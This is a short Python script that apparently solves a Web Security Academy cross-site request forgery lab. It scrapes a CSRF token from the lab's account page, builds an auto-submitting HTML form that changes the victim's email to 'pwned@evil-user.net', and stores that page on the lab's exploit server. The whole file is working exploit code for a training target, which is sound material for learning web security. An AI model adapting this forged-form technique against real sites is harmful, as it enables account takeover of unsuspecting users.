from bs4 import BeautifulSoup
import requests

site = 'aca81ffe1e4fabd380b408de004e001c.web-security-academy.net'


s = requests.Session()
url = f'https://{site}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

change_url = f'https://{site}/my-account'
resp = s.get(change_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

exploit_html = f'''<html>
  <body>
  <form action="https://{site}/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net">
    <input type="hidden" name="csrf" value="{csrf}" />
  </form>
  <script>
    document.forms[0].submit();
    </script>
    </body>
</html>'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)